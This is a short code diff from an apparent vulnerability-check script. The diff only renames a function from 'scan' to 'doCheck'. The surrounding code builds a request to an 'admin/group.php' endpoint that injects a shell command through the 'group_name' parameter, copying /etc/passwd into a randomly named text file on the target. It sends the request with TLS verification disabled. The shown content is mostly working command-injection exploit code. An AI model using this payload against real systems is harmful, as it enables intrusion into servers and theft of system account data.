@@ -10,7 +10,7 @@ def randomLowercase(n):
 		key+=zf[suiji1]
 	return key
 fileName=randomLowercase(5)
-def scan(baseurl):
+def doCheck(baseurl):
 	url=baseurl+f"admin/group.php?memberid=root&cmd=add&group_name=d;cat%20/etc/passwd>{fileName}.txt"
 	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
 	response=requests.get(url,headers=headers,timeout=5,verify=False)
